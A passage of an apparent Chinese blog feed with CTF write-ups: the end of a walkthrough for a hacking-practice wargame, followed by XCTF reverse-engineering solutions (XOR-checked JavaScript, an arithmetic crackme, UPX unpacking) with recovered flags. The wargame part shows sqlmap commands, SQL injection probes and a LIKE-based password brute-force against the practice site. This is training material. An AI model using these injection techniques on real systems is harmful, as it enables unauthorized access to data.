class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.fj543.com/hack/13sql.asp --data=&quot;id=154&amp;password=111&quot; --batch</span><br><span class="line">sqlmap -u http://www.fj543.com/hack/13sql.asp --data=&quot;id=154&amp;password=111&quot; --batch --tables</span><br></pre></td></tr></table></figure><p>自动化注入好像不行，开始手注。</p><p>输入1</p><blockquote><p> 数据库中有这条信息,但我不能直接告诉你密码。 </p></blockquote><p>输入1 and 1=1</p><blockquote><p> 数据库中有这条信息,但我不能直接告诉你密码。 </p></blockquote><p>输入-1</p><blockquote><p> 没有找到此ID对应的内容。 </p></blockquote><p>输入-1 or 1=1</p><blockquote><p> 数据库中有这条信息,但我不能直接告诉你密码。 </p></blockquote><p>反正就不告诉我，普通手注从网页中返回不了有效信息，大佬们wp中的思路：猜密码的字段名为pwd，构造<code>154 and pwd like &#39;%a%&#39;</code>，抓包，将$a$暴力破解。我猜意思是pwd是由暴力破解得出的字符组成的。</p><blockquote><p>id=154+and+pwd+like+%27%25a%25%27</p><p>id=154+and+pwd+like+%27%25$a$%25%27</p></blockquote><p>破解发现<code>bdguvBDGUV</code>都有，我猜密码是5个字符，不区分大小写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;bdguv.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(<span class="string">&#x27;bdguv&#x27;</span>, <span class="number">5</span>):</span><br><span class="line">    c = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    f.write(c+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>回到<code>http://www.fj543.com/hack/?level=13sql</code>抓包，设置参数用bdguv.txt爆破。返回状态302的即是正确密码。</p><p>14-<a href="http://www.fj543.com/hack/?level=14crack">http://www.fj543.com/hack/?level=14crack</a></p><p>令牌下载下来的名字<code>file.exe.html</code>，将html删去，运行一下，让我们输入密码。扔去OD看看字符串：右键-&gt;中文搜索引擎-&gt;智能搜索</p><p>可以看到一些奇怪的字符串，组合起来为<code>love543</code>，估计这个就是密码，输入就可得到令牌。</p><p>通关。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;http://www.fj543.com/hack/&quot;&gt;黑客丛林之旅&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;1-&lt;a href=&quot;http://www.fj543.com/hack/?level=1&quot;&gt;http://www.fj543.com/hack/?level=1&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;提示语：在浏览器端用脚本进行身份验证是很容易被破解的。(The Client-side authentication is not secure) &lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="综合" scheme="http://example.com/categories/%E7%BB%BC%E5%90%88/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界 逆向高手进阶区</title>
    <link href="http://example.com/posts/5a99a36.html"/>
    <id>http://example.com/posts/5a99a36.html</id>
    <published>2022-04-05T01:29:28.272Z</published>
    <updated>2022-04-11T05:25:29.836Z</updated>
    
    <content type="html"><![CDATA[<p>新手练习区完结，高手进阶区有些也做过了。如果在这里找不到笔记，请到<a href="https://blog.csdn.net/Leong_Vinson">小凉的CSDN博客</a>去找，如果没有那就真没有了。</p><span id="more"></span><h1 id="1-secret-string-400"><a href="#1-secret-string-400" class="headerlink" title="1. secret-string-400"></a>1. secret-string-400</h1><p>下载下来是个<code>.gz</code>文件，拖进kali解压，发现又是一个压缩文件，继续解压。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">                    </span><br><span class="line">┌──(v5le0n9㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gzip -d secret.gz  </span><br><span class="line">                                                                             </span><br><span class="line">┌──(v5le0n9㉿kali)-[~/Desktop]</span><br><span class="line">└─$ file secret</span><br><span class="line">secret: POSIX tar archive</span><br><span class="line">                                                                             </span><br><span class="line">┌──(v5le0n9㉿kali)-[~/Desktop]</span><br><span class="line">└─$ tar -xvf secret</span><br><span class="line">./._Task.html</span><br><span class="line">Task.html</span><br><span class="line">./._Machine.js</span><br><span class="line">Machine.js</span><br></pre></td></tr></table></figure><p>解压出来一个html文件和一个js文件。打开html文件输入字符串试试，啥都没有。要我们输入一个无效字符串才可以得到flag。</p><img src="/posts/5a99a36/1.1.png" class="" title="输入字符串"><p>打开js分析check()函数。</p><img src="/posts/5a99a36/1.2.png" class="" title="js代码"><p>loadcode()用来加载aardio代码，或一个aardio代码文件，并创建一个函数对象。函数原型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数对象,错误信息 = loadcode(codeString | filepath)</span><br></pre></td></tr></table></figure><p>参数可以是包含aardio代码的字符串值，也可以是aardio代码文件的路径。路径可以用斜杠作为首字符表示应用程序根目录。该函数并不立即执行代码，而是返回一个函数对象。如果加载代码失败，则返回的函数对象为null值，并在第二个返回值中返回错误信息。</p><p>所以那些数字其实是aardio代码。先去到run函数看看。</p><img src="/posts/5a99a36/1.3.png" class="" title="js代码"><img src="/posts/5a99a36/1.4.png" class="" title="js代码"><p>救…js我实在不会啊！看了牛牛们的wp，通过修改js文件将命令参数打印在Console中。在run函数中加入代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;new Opcode&#x27;</span> + command.<span class="property">args</span>)</span><br></pre></td></tr></table></figure><img src="/posts/5a99a36/1.5.png" class="" title="js代码"><p>运行一下，在Console中就可以看到被解析出来的代码了。</p><img src="/posts/5a99a36/1.6.png" class="" title="console"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f=<span class="variable language_">window</span>.<span class="property">machine</span>.<span class="property">registers</span>[<span class="number">1</span>].<span class="property">userinput</span><span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> i = f.<span class="property">length</span><span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> nonce = <span class="string">&#x27;groke&#x27;</span>;<span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> j = <span class="number">0</span>;<span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> out = [];<span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> eq = <span class="literal">true</span>;<span class="comment">//</span></span><br><span class="line"><span class="keyword">while</span>(j &lt; i)&#123;<span class="comment">//</span></span><br><span class="line">out.<span class="title function_">push</span>(f.<span class="title function_">charCodeAt</span>(j) ^ nonce.<span class="title function_">charCodeAt</span>(j%<span class="number">5</span>))<span class="comment">//</span></span><br><span class="line">j++;<span class="comment">//</span></span><br><span class="line">&#125;<span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> ex =  [<span class="number">1</span>, <span class="number">30</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">69</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">85</span>, <span class="number">75</span>, <span class="number">50</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">48</span>, <span class="number">24</span>, <span class="number">10</span>, <span class="number">56</span>, <span class="number">55</span>, <span class="number">46</span>, <span class="number">56</span>, <span class="number">60</span>];<span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> (ex.<span class="property">length</span> == out.<span class="property">length</span>) &#123;<span class="comment">//</span></span><br><span class="line">j = <span class="number">0</span>;<span class="comment">//</span></span><br><span class="line"><span class="keyword">while</span>(j &lt; ex.<span class="property">length</span>)&#123;<span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span>(ex[j] != out[j])<span class="comment">//</span></span><br><span class="line">eq = <span class="literal">false</span>;<span class="comment">//</span></span><br><span class="line">j += <span class="number">1</span>;<span class="comment">//</span></span><br><span class="line">&#125;<span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span>(eq)&#123;<span class="comment">//</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;YOU WIN!&#x27;</span>);<span class="comment">//</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;NOPE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;<span class="title function_">alert</span>(<span class="string">&#x27;NOPE!&#x27;</span>);&#125;<span class="comment">//</span></span><br></pre></td></tr></table></figure><p>这些代码我就看懂了。输入的长度与ex长度要相等，经过异或算法最终要与ex中的元素相等。马上编写逆向脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ex =  [<span class="number">1</span>, <span class="number">30</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">69</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">85</span>, <span class="number">75</span>, <span class="number">50</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">48</span>, <span class="number">24</span>, <span class="number">10</span>, <span class="number">56</span>, <span class="number">55</span>, <span class="number">46</span>, <span class="number">56</span>, <span class="number">60</span>]</span><br><span class="line">nonce = <span class="built_in">list</span>(<span class="string">&#x27;groke&#x27;</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ex)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(ex[i] ^ <span class="built_in">ord</span>(nonce[i%<span class="number">5</span>]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag is: WOW_so_EASY</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WOW_so_EASY</span><br></pre></td></tr></table></figure><p>原来这就是Web逆向嘛，呜呜呜呜js硬伤啊</p><h1 id="2-Newbie-calculations"><a href="#2-Newbie-calculations" class="headerlink" title="2. Newbie_calculations"></a>2. Newbie_calculations</h1><p>运行一下，发现输入不了任何东西。载入OD，发现每隔一段时间暂停一下它会停在不同的地址，说明这个程序一直在运行，而不是等待我们输入。</p><p>载入IDA查看伪代码，发现它在不停地调用这几个函数。</p><img src="/posts/5a99a36/2.1.png" class="" title="IDA分析"><p>一个个进去看，反编译乱死了…</p><img src="/posts/5a99a36/2.2.png" class="" title="IDA分析"><img src="/posts/5a99a36/2.3.png" class="" title="IDA分析"><img src="/posts/5a99a36/2.4.png" class="" title="IDA分析"><p>知道每个函数的作用后，抄一遍代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mul_401100</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">return</span> a*b</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_401220</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">return</span> a-b</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_401000</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">return</span> a+b</span><br><span class="line">flag=[<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">v121 = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Your flag is:&quot;</span>)</span><br><span class="line">v3 = mul_401100(flag[<span class="number">0</span>], <span class="number">0x3B9ACA00</span>)</span><br><span class="line">v4 = sub_401220(v3, <span class="number">0x3B9AC9CE</span>)</span><br><span class="line">flag[<span class="number">0</span>]=mul_401100(v4, <span class="number">2</span>)</span><br><span class="line">v5 = add_401000(flag[<span class="number">1</span>], <span class="number">0x4C4B40</span>)</span><br><span class="line">v6 = sub_401220(v5, <span class="number">0x65B9AA</span>)</span><br><span class="line">v7 = add_401000(v6, <span class="number">1666666</span>)</span><br><span class="line">v8 = add_401000(v7, <span class="number">45</span>)</span><br><span class="line">v9 = mul_401100(v8, <span class="number">2</span>)</span><br><span class="line">flag[<span class="number">1</span>]=add_401000(v9, <span class="number">5</span>)</span><br><span class="line">v10 = mul_401100(flag[<span class="number">2</span>], <span class="number">0x3B9ACA00</span>)</span><br><span class="line">v11 = sub_401220(v10, <span class="number">999999950</span>)</span><br><span class="line">v12 = mul_401100(v11, <span class="number">2</span>)</span><br><span class="line">flag[<span class="number">2</span>]=add_401000(v12, <span class="number">2</span>)</span><br><span class="line">v13 = add_401000(flag[<span class="number">3</span>], <span class="number">55</span>)</span><br><span class="line">v14 = sub_401220(v13, <span class="number">3</span>)</span><br><span class="line">v15 = add_401000(v14, <span class="number">4</span>)</span><br><span class="line">flag[<span class="number">3</span>]=sub_401220(v15, <span class="number">1</span>)</span><br><span class="line">v16 = mul_401100(flag[<span class="number">4</span>], <span class="number">100000000</span>)</span><br><span class="line">v17 = sub_401220(v16, <span class="number">99999950</span>)</span><br><span class="line">v18 = mul_401100(v17, <span class="number">2</span>)</span><br><span class="line">flag[<span class="number">4</span>]=add_401000(v18, <span class="number">2</span>)</span><br><span class="line">v19 = sub_401220(flag[<span class="number">5</span>], <span class="number">1</span>)</span><br><span class="line">v20 = mul_401100(v19, <span class="number">1000000000</span>)</span><br><span class="line">v21 = add_401000(v20, <span class="number">55</span>)</span><br><span class="line">flag[<span class="number">5</span>]=sub_401220(v21, <span class="number">3</span>)</span><br><span class="line">v22 = mul_401100(flag[<span class="number">6</span>], <span class="number">1000000</span>)</span><br><span class="line">v23 = sub_401220(v22, <span class="number">999975</span>)</span><br><span class="line">flag[<span class="number">6</span>]=mul_401100(v23, <span class="number">4</span>)</span><br><span class="line">v24 = add_401000(flag[<span class="number">7</span>], <span class="number">55</span>)</span><br><span class="line">v25 = sub_401220(v24, <span class="number">33</span>)</span><br><span class="line">v26 = add_401000(v25, <span class="number">44</span>)</span><br><span class="line">flag[<span class="number">7</span>]=sub_401220(v26, <span class="number">11</span>)</span><br><span class="line">v27 = mul_401100(flag[<span class="number">8</span>], <span class="number">10</span>)</span><br><span class="line">v28 = sub_401220(v27, <span class="number">5</span>)</span><br><span class="line">v29 = mul_401100(v28, <span class="number">8</span>)</span><br><span class="line">flag[<span class="number">8</span>]=add_401000(v29, <span class="number">9</span>)</span><br><span class="line">v30 = add_401000(flag[<span class="number">9</span>], <span class="number">0</span>)</span><br><span class="line">v31 = sub_401220(v30, <span class="number">0</span>)</span><br><span class="line">v32 = add_401000(v31, <span class="number">11</span>)</span><br><span class="line">v33 = sub_401220(v32, <span class="number">11</span>)</span><br><span class="line">flag[<span class="number">9</span>]=add_401000(v33, <span class="number">53</span>)</span><br><span class="line">v34 = add_401000(flag[<span class="number">10</span>], <span class="number">49</span>)</span><br><span class="line">v35 = sub_401220(v34, <span class="number">2</span>)</span><br><span class="line">v36 = add_401000(v35, <span class="number">4</span>)</span><br><span class="line">flag[<span class="number">10</span>]=sub_401220(v36, <span class="number">2</span>)</span><br><span class="line">v37 = mul_401100(flag[<span class="number">11</span>], <span class="number">1000000</span>)</span><br><span class="line">v38 = sub_401220(v37, <span class="number">999999</span>)</span><br><span class="line">v39 = mul_401100(v38, <span class="number">4</span>)</span><br><span class="line">flag[<span class="number">11</span>]=add_401000(v39, <span class="number">50</span>)</span><br><span class="line">v40 = add_401000(flag[<span class="number">12</span>], <span class="number">1</span>)</span><br><span class="line">v41 = add_401000(v40, <span class="number">1</span>)</span><br><span class="line">v42 = add_401000(v41, <span class="number">1</span>)</span><br><span class="line">v43 = add_401000(v42, <span class="number">1</span>)</span><br><span class="line">v44 = add_401000(v43, <span class="number">1</span>)</span><br><span class="line">v45 = add_401000(v44, <span class="number">1</span>)</span><br><span class="line">v46 = add_401000(v45, <span class="number">10</span>)</span><br><span class="line">flag[<span class="number">12</span>]=add_401000(v46, <span class="number">32</span>)</span><br><span class="line">v47 = mul_401100(flag[<span class="number">13</span>], <span class="number">10</span>)</span><br><span class="line">v48 = sub_401220(v47, <span class="number">5</span>)</span><br><span class="line">v49 = mul_401100(v48, <span class="number">8</span>)</span><br><span class="line">v50 = add_401000(v49, <span class="number">9</span>)</span><br><span class="line">flag[<span class="number">13</span>]=add_401000(v50, <span class="number">48</span>)</span><br><span class="line">v51 = sub_401220(flag[<span class="number">14</span>], <span class="number">1</span>)</span><br><span class="line">v52 = mul_401100(v51, -<span class="number">294967296</span>)</span><br><span class="line">v53 = add_401000(v52, <span class="number">55</span>)</span><br><span class="line">flag[<span class="number">14</span>]=sub_401220(v53, <span class="number">3</span>)</span><br><span class="line">v54 = add_401000(flag[<span class="number">15</span>], <span class="number">1</span>)</span><br><span class="line">v55 = add_401000(v54, <span class="number">2</span>)</span><br><span class="line">v56 = add_401000(v55, <span class="number">3</span>)</span><br><span class="line">v57 = add_401000(v56, <span class="number">4</span>)</span><br><span class="line">v58 = add_401000(v57, <span class="number">5</span>)</span><br><span class="line">v59 = add_401000(v58, <span class="number">6</span>)</span><br><span class="line">v60 = add_401000(v59, <span class="number">7</span>)</span><br><span class="line">flag[<span class="number">15</span>]=add_401000(v60, <span class="number">20</span>)</span><br><span class="line">v61 = mul_401100(flag[<span class="number">16</span>], <span class="number">10</span>)</span><br><span class="line">v62 = sub_401220(v61, <span class="number">5</span>)</span><br><span class="line">v63 = mul_401100(v62, <span class="number">8</span>)</span><br><span class="line">v64 = add_401000(v63, <span class="number">9</span>)</span><br><span class="line">flag[<span class="number">16</span>]=add_401000(v64, <span class="number">48</span>)</span><br><span class="line">v65 = add_401000(flag[<span class="number">17</span>], <span class="number">7</span>)</span><br><span class="line">v66 = add_401000(v65, <span class="number">6</span>)</span><br><span class="line">v67 = add_401000(v66, <span class="number">5</span>)</span><br><span class="line">v68 = add_401000(v67, <span class="number">4</span>)</span><br><span class="line">v69 = add_401000(v68, <span class="number">3</span>)</span><br><span class="line">v70 = add_401000(v69, <span class="number">2</span>)</span><br><span class="line">v71 = add_401000(v70, <span class="number">1</span>)</span><br><span class="line">flag[<span class="number">17</span>]=add_401000(v71, <span class="number">20</span>)</span><br><span class="line">v72 = add_401000(flag[<span class="number">18</span>], <span class="number">7</span>)</span><br><span class="line">v73 = add_401000(v72, <span class="number">2</span>)</span><br><span class="line">v74 = add_401000(v73, <span class="number">4</span>)</span><br><span class="line">v75 = add_401000(v74, <span class="number">3</span>)</span><br><span class="line">v76 = add_401000(v75, <span class="number">6</span>)</span><br><span class="line">v77 = add_401000(v76, <span class="number">5</span>)</span><br><span class="line">v78 = add_401000(v77, <span class="number">1</span>)</span><br><span class="line">flag[<span class="number">18</span>]=add_401000(v78, <span class="number">20</span>)</span><br><span class="line">v79 = mul_401100(flag[<span class="number">19</span>], <span class="number">1000000</span>)</span><br><span class="line">v80 = sub_401220(v79, <span class="number">999999</span>)</span><br><span class="line">v81 = mul_401100(v80, <span class="number">4</span>)</span><br><span class="line">v82 = add_401000(v81, <span class="number">50</span>)</span><br><span class="line">flag[<span class="number">19</span>]=sub_401220(v82, <span class="number">1</span>)</span><br><span class="line">v83 = sub_401220(flag[<span class="number">20</span>], <span class="number">1</span>)</span><br><span class="line">v84 = mul_401100(v83, -<span class="number">294967296</span>)</span><br><span class="line">v85 = add_401000(v84, <span class="number">49</span>)</span><br><span class="line">flag[<span class="number">20</span>]=sub_401220(v85, <span class="number">1</span>)</span><br><span class="line">v86 = sub_401220(flag[<span class="number">21</span>], <span class="number">1</span>)</span><br><span class="line">v87 = mul_401100(v86, <span class="number">1000000000</span>)</span><br><span class="line">v88 = add_401000(v87, <span class="number">54</span>)</span><br><span class="line">v89 = sub_401220(v88, <span class="number">1</span>)</span><br><span class="line">v90 = add_401000(v89, <span class="number">1000000000</span>)</span><br><span class="line">flag[<span class="number">21</span>]=sub_401220(v90, <span class="number">1000000000</span>)</span><br><span class="line">v91 = add_401000(flag[<span class="number">22</span>], <span class="number">49</span>)</span><br><span class="line">v92 = sub_401220(v91, <span class="number">1</span>)</span><br><span class="line">v93 = add_401000(v92, <span class="number">2</span>)</span><br><span class="line">flag[<span class="number">22</span>]=sub_401220(v93, <span class="number">1</span>)</span><br><span class="line">v94 = mul_401100(flag[<span class="number">23</span>], <span class="number">10</span>)</span><br><span class="line">v95 = sub_401220(v94, <span class="number">5</span>)</span><br><span class="line">v96 = mul_401100(v95, <span class="number">8</span>)</span><br><span class="line">v97 = add_401000(v96, <span class="number">9</span>)</span><br><span class="line">flag[<span class="number">23</span>]=add_401000(v97, <span class="number">48</span>)</span><br><span class="line">v98 = add_401000(flag[<span class="number">24</span>], <span class="number">1</span>)</span><br><span class="line">v99 = add_401000(v98, <span class="number">3</span>)</span><br><span class="line">v100 = add_401000(v99, <span class="number">3</span>)</span><br><span class="line">v101 = add_401000(v100, <span class="number">3</span>)</span><br><span class="line">v102 = add_401000(v101, <span class="number">6</span>)</span><br><span class="line">v103 = add_401000(v102, <span class="number">6</span>)</span><br><span class="line">v104 = add_401000(v103, <span class="number">6</span>)</span><br><span class="line">flag[<span class="number">24</span>]=add_401000(v104, <span class="number">20</span>)</span><br><span class="line">v105 = add_401000(flag[<span class="number">25</span>], <span class="number">55</span>)</span><br><span class="line">v106 = sub_401220(v105, <span class="number">33</span>)</span><br><span class="line">v107 = add_401000(v106, <span class="number">44</span>)</span><br><span class="line">v108 = sub_401220(v107, <span class="number">11</span>)</span><br><span class="line">flag[<span class="number">25</span>]=add_401000(v108, <span class="number">42</span>)</span><br><span class="line">flag[<span class="number">26</span>]=add_401000(flag[<span class="number">26</span>], flag[<span class="number">25</span>])</span><br><span class="line">flag[<span class="number">27</span>]=add_401000(flag[<span class="number">27</span>], flag[<span class="number">12</span>])</span><br><span class="line">v109 = flag[<span class="number">27</span>]</span><br><span class="line">v110 = sub_401220(flag[<span class="number">28</span>], <span class="number">1</span>)</span><br><span class="line">v111 = add_401000(v110, v109)</span><br><span class="line">flag[<span class="number">28</span>]=sub_401220(v111, <span class="number">1</span>)</span><br><span class="line">v112 = flag[<span class="number">23</span>]</span><br><span class="line">v113 = sub_401220(flag[<span class="number">29</span>], <span class="number">1</span>)</span><br><span class="line">v114 = mul_401100(v113, <span class="number">1000000</span>)</span><br><span class="line">flag[<span class="number">29</span>]=add_401000(v114, v112)</span><br><span class="line">v115 = flag[<span class="number">27</span>]</span><br><span class="line">v116 = add_401000(flag[<span class="number">30</span>], <span class="number">1</span>)</span><br><span class="line">flag[<span class="number">30</span>]=mul_401100(v116, v115)</span><br><span class="line">flag[<span class="number">31</span>]=add_401000(flag[<span class="number">31</span>], flag[<span class="number">30</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;CTF&#123;&quot;</span>+<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,flag))+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Your flag is:</span></span><br><span class="line"><span class="string">CTF&#123;daf8f4d816261a41a115052a1bc21ade&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="3-easyre-153"><a href="#3-easyre-153" class="headerlink" title="3. easyre-153"></a>3. easyre-153</h1><p>查壳，UPX壳，拖进Ubuntu输入脱壳命令直接脱掉。</p><img src="/posts/5a99a36/3.1.png" class="" title="UPX脱壳"><p><a href="https://blog.csdn.net/xiao__1bai/article/details/120360202">https://blog.csdn.net/xiao__1bai/article/details/120360202</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;新手练习区完结，高手进阶区有些也做过了。如果在这里找不到笔记，请到&lt;a href=&quot;https://blog.csdn.net/Leong_Vinson&quot;&gt;小凉的CSDN博客&lt;/a&gt;去找，如果没有那就真没有了。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="Reverse" scheme="http://example.com/tags/Reverse/"/>
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="x64dbg" scheme="http://example.com/tags/x64dbg/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界 Android逆向合集</title>
    <link href="http://example.com/posts/9f62af2.html"/>
    <id>http://example.com/posts/9f62af2.html</id>
    <published>2022-04-05T01:29:28.252Z</published>
    <updated>2022-04-11T05:25:33.361Z</updated>
    
